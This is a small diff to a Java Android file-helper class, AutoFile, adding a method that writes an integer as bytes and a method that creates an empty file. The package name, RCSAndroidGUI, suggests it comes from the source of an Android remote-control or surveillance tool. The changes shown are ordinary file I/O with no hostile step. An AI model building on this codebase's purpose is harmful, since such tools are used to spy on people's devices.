@@ -19,6 +19,7 @@ import java.io.OutputStream;
 import java.util.Date;
 
 import com.ht.RCSAndroidGUI.util.Check;
+import com.ht.RCSAndroidGUI.util.Utils;
 
 import android.util.Log;
 
@@ -132,6 +133,10 @@ public final class AutoFile {
 		}
 	}
 
+	public void write(int value) {
+		write(Utils.intToByteArray(value));
+	}
+
 	/**
 	 * Append some data to the file.
 	 * 
@@ -219,5 +224,10 @@ public final class AutoFile {
 		boolean ret = file.renameTo(newfile);
 
 		Log.d("QZ", TAG + " renaming file: " + newfile + " ret: " + ret);
+	}
+
+	public void create() {
+		write(new byte[0]);
+		Check.ensures(file.exists(), "Non existing files");
 	}
 }
